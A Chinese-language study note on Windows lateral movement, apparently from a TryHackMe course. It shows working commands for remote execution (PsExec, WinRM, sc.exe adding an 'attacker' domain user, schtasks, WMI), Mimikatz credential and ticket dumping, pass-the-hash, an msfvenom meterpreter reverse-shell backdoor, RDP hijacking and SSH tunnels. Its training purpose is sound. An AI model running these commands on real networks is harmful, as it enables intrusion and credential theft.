#### 概述 (Overview)

- 什么是横向移动 (What is Lateral Movement?)：
    
    横向移动是指攻击者在获得网络初始立足点后，用于在网络内部进行移动的一系列技术。这一过程对于达成最终目标至关重要。
    
- **目的 (Objectives)**：
    
    - **实现目标 (Achieve Objectives)**：访问无法从初始立足点直接到达的目标资产，如内部代码仓库或数据库。
    - **规避限制 (Bypass Restrictions)**：绕过防火墙策略和网络分段。
    - **建立持久化 (Establish Persistence)**：在网络中创建多个入口点，以防初始访问权限丢失。
    - **混淆视听 (Create Confusion)**：通过模拟合法用户行为来躲避检测。
- 横向移动循环 (The Lateral Movement Cycle)：
    
    横向移动并非线性的单一步骤，而是一个循环过程：
    
    1. **移动 (Move)**：使用现有凭证访问新主机。
    2. **提权 (Elevate)**：在新主机上提升权限。
    3. **提取 (Extract)**：从新主机上提取更多凭证（哈希、票据、明文密码等）。
    4. **重复 (Repeat)**：使用新获取的凭证开始新一轮的移动。
- **操作安全考量 (Operational Security Considerations)**：
    
    - **UAC 对远程管理的影响**：用户账户控制 (UAC) 会对远程管理施加限制。默认情况下，属于本地管理员组的**域账户**可以远程执行管理任务。然而，属于本地管理员组的**本地账户**（默认的`Administrator`账户除外）在通过非交互式会话（如 WinRM, SMB）连接时，会收到一个被过滤的中等完整性令牌，导致无法执行特权操作。在横向移动失败时，应考虑到此因素。

---

#### 远程执行技术 (Remote Execution Techniques)

这些技术允许攻击者在远程主机上执行命令或代码，是横向移动的基础。

- **通过 PsExec (Via PsExec)**：
    
    - **端口 (Ports)**: 445/TCP (SMB)
    - **所需权限 (Required Permissions)**: 目标主机的管理员权限。
    - **工作原理 (How it Works)**:
        1. 连接到远程主机的 `Admin$` 共享。
        2. 上传一个服务二进制文件（默认为 `psexesvc.exe`）到 `C:\Windows\` 目录。
        3. 通过 RPC 连接到服务控制管理器 (SCM)，创建并启动名为 `PSEXESVC` 的服务，该服务执行上传的二进制文件。
        4. 通过命名管道重定向远程命令的输入、输出和错误流。
    - **命令示例 (Example Command)**:
        
        Bash
        
        ```
        psexec64.exe \\<TARGET_IP> -u Administrator -p <Password> -i cmd.exe
        ```
        
- **通过 Windows 远程管理 (Via WinRM)**：
    
    - **端口 (Ports)**: 5985/TCP (HTTP), 5986/TCP (HTTPS)
    - **所需权限 (Required Permissions)**: 远程管理用户 (Remote Management Users) 组成员。
    - **命令示例 (Example Commands)**:
        - **使用 winrs.exe**:
            
            Bash
            
            ```
            winrs.exe -r:<TARGET_IP> -u:Administrator -p:<Password> cmd
            ```
            
        - **使用 PowerShell**:
            
            PowerShell
            
            ```
            # 1. 创建凭证对象
            $cred = New-Object System.Management.Automation.PSCredential 'Administrator', (ConvertTo-SecureString 'Password' -AsPlainText -Force)
            
            # 2. 建立交互式会话
            Enter-PSSession -ComputerName <TARGET_IP> -Credential $cred
            
            # 3. 或执行单个命令
            Invoke-Command -ComputerName <TARGET_IP> -Credential $cred -ScriptBlock { whoami }
            ```
            
- **通过远程服务 (Via Remote Services - `sc.exe`)**:
    
    - **端口 (Ports)**: 135/TCP, 49152-65535/TCP (DCE/RPC); 445/TCP (RPC over SMB)
    - **所需权限 (Required Permissions)**: 管理员权限。
    - **工作原理 (How it Works)**: 使用内置的 `sc.exe` 工具通过 RPC 远程连接到服务控制管理器，创建一个配置为执行任意命令的服务，然后启动该服务。这是一个“盲”执行，无法直接看到命令输出。
    - **命令示例 (Example Commands)**:
        
        Bash
        
        ```
        # 创建服务，binPath 指向要执行的命令
        sc.exe \\<TARGET_IP> create THMservice binPath= "net user attacker Pass123 /add /domain"
        # 启动服务
        sc.exe \\<TARGET_IP> start THMservice
        # 清理
        sc.exe \\<TARGET_IP> stop THMservice
        sc.exe \\<TARGET_IP> delete THMservice
        ```
        
- **通过计划任务 (Via Scheduled Tasks - `schtasks.exe`)**:
    
    - **端口 (Ports)**: 与 `sc.exe` 相同 (RPC)。
    - **所需权限 (Required Permissions)**: 管理员权限。
    - **工作原理 (How it Works)**: 使用内置的 `schtasks.exe` 工具在远程主机上创建一次性任务，然后立即运行它。这也是一种“盲”执行。
    - **命令示例 (Example Commands)**:
        
        Bash
        
        ```
        # 创建一个一次性任务
        schtasks /s <TARGET_IP> /RU "SYSTEM" /create /tn "THMtask" /tr "payload.exe" /sc ONCE /sd 01/01/1970 /st 00:00
        # 立即运行任务
        schtasks /s <TARGET_IP> /run /tn "THMtask"
        # 清理
        schtasks /s <TARGET_IP> /delete /tn "THMtask" /f
        ```
        
- **通过 Windows 管理规范 (Via WMI)**：
    
    - **概述 (Overview)**: WMI 是一种功能强大的管理接口，可通过 DCOM (RPC) 或 WinRM 协议进行远程访问。
    - **创建远程进程 (Create Remote Process)**: 调用 `Win32_Process` 类的 `Create` 方法。
        
        PowerShell
        
        ```
        # 假设 $Session 是已建立的 CimSession
        Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "calc.exe"}
        ```
        
    - **安装 MSI 包 (Install MSI Package)**: 调用 `Win32_Product` 类的 `Install` 方法，可用于部署恶意 MSI 安装包。
        
        PowerShell
        
        ```
        Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\evil.msi"}
        ```
        

---

#### 利用备用认证凭据 (Leveraging Alternate Credentials)

当无法获取明文密码时，可以利用从内存或系统中提取的哈希或票据进行认证。

- **传递哈希 (Pass-the-Hash, PtH)**：
    
    - **基本原理 (Fundamentals)**: 在 NTLM 认证中，客户端使用密码的 NTLM 哈希来加密挑战。因此，只要拥有 NTLM 哈希，就无需知道明文密码即可完成认证。
    - **哈希提取 (Hash Extraction)**: 使用 Mimikatz 等工具从 LSASS 进程内存 (`sekurlsa::msv`) 或 SAM 数据库 (`lsadump::sam`) 中提取。
    - **执行攻击 (Execution)**:
        - **Mimikatz**: 使用 `sekurlsa::pth` 命令启动一个新进程，该进程的网络活动将使用指定的哈希进行认证。
            
            PowerShell
            
            ```
            sekurlsa::pth /user:bob /domain:corp /ntlm:deadbeef... /run:cmd.exe
            ```
            
        - **Linux 工具**: Impacket (`psexec.py`), FreeRDP (`xfreerdp`), `evil-winrm` 等工具均原生支持使用 `-hashes` 或 `/pth` 参数进行 PtH 攻击。
- **传递票据 (Pass-the-Ticket, PtT)**：
    
    - **基本原理 (Fundamentals)**: Kerberos 认证依赖于票据（TGTs 和 TGSs）。攻击者可以从 LSASS 内存中窃取合法的 Kerberos 票据，并将其注入到自己的会话中，从而冒充票据的合法所有者。
    - **票据提取与注入 (Ticket Extraction and Injection)**:
        
        PowerShell
        
        ```
        # 1. (需要SYSTEM权限) 导出内存中的所有 Kerberos 票据为 .kirbi 文件
        privilege::debug
        sekurlsa::tickets /export
        
        # 2. (无需高权限) 将导出的票据注入当前会话
        kerberos::ptt ticket.kirbi
        ```
        
    - **验证 (Verification)**: 使用 `klist` 命令查看当前会话中已加载的票据。
- **传递密钥 (Pass-the-Key) / 哈希传递升级版 (Overpass-the-Hash, OPtH)**：
    
    - **基本原理 (Fundamentals)**: Kerberos TGT 请求的初始验证器是使用用户密码衍生的长期密钥（如 RC4, AES128, AES256 密钥）加密的时间戳。拥有这些密钥等同于拥有密码。
    - **OPtH**: RC4 密钥与用户的 NTLM 哈希相同。因此，如果域支持 RC4 算法，拥有 NTLM 哈希就可以直接请求 TGT，这种技术被称为 Overpass-the-Hash。
    - **执行攻击 (Execution)**: Mimikatz 的 `sekurlsa::pth` 命令同样支持使用 Kerberos 密钥。
        
        PowerShell
        
        ```
        # 使用 RC4 密钥 (NTLM 哈希)
        sekurlsa::pth /user:admin /domain:corp /rc4:deadbeef... /run:cmd.exe
        
        # 使用 AES256 密钥
        sekurlsa::pth /user:admin /domain:corp /aes256:deadbeef... /run:cmd.exe
        ```
        

---

#### 滥用用户及环境行为 (Abusing User and Environmental Behavior)

- **利用可写共享 (Exploiting Writable Shares)**：
    
    - **攻击原理 (Attack Principle)**: 若攻击者对用户经常访问的网络共享具有写权限，可以替换或后门化其中的合法文件（如脚本、可执行文件），在用户下次执行时触发恶意载荷。
    - **后门植入 .EXE 文件 (Backdooring .EXE Files)**: 使用 `msfvenom` 可以将 payload 注入到一个现有的可执行文件中，同时尽量保持其原有功能。
        
        Bash
        
        ```
        msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o putty_backdoored.exe
        ```
        
- **远程桌面会话劫持 (RDP Session Hijacking)**：
    
    - **攻击原理 (Attack Principle)**: 在 Windows Server 2016 及更早版本上，拥有 `SYSTEM` 权限的攻击者可以无缝接管另一个用户（即使是高权限用户）的已断开连接（Disconnected）的 RDP 会话，而无需输入密码。
    - **执行步骤 (Execution Steps)**:
        1. 获取 `SYSTEM` 权限的 shell（如 `psexec -s -i cmd.exe`）。
        2. 使用 `query user` 命令列出当前所有会话及其 ID。
        3. 使用 `tscon.exe <target_session_id>` 命令接管目标会话。

---

#### 网络隧道与端口转发 (Network Tunneling and Port Forwarding)

- **概述 (Overview)**: 当直接网络路径被防火墙或网络分段阻断时，可以使用已控主机作为跳板，建立隧道来转发流量。
- **使用 SSH (Using SSH)**: Windows 系统现已内置 OpenSSH 客户端，使其成为一种可行的隧道工具。
    - **本地端口转发 (`-L`)**: 将**本地**（攻击机）端口上的流量通过 SSH 隧道转发到**远程**（SSH 服务器）网络中的一个目标。常用于将远程服务映射到本地访问。
        
        Bash
        
        ```
        # 将本地 8080 端口映射到 SSH 服务器能访问的 10.0.0.5 的 80 端口
        ssh user@ssh-server -L 8080:10.0.0.5:80
        ```
        
    - **远程端口转发 (`-R`)**: 将**远程**（SSH 服务器）端口上的流量通过 SSH 隧道转发回**本地**（攻击机）网络中的一个目标。常用于将内部服务暴露给外部，或接收反向连接。
        
        Bash
        
        ```
        # 在跳板机上执行，将攻击机的 4444 端口暴露在跳板机的 8080 端口上
        ssh attacker@attacker-pc -R 8080:127.0.0.1:4444
        ```
        
    - **动态端口转发 (`-D`) / SOCKS 代理**: 在本地创建一个 SOCKS 代理服务器，所有通过该代理的流量都将通过 SSH 隧道转发。极其灵活，适用于需要访问多个目标和端口的场景。

s # 在本地 9050 端口上创建一个 SOCKS 代理

ssh user@ssh-server -D 9050

```

配合 proxychains 等工具，可以轻松地让任何命令行应用通过此 SOCKS 代理进行通信。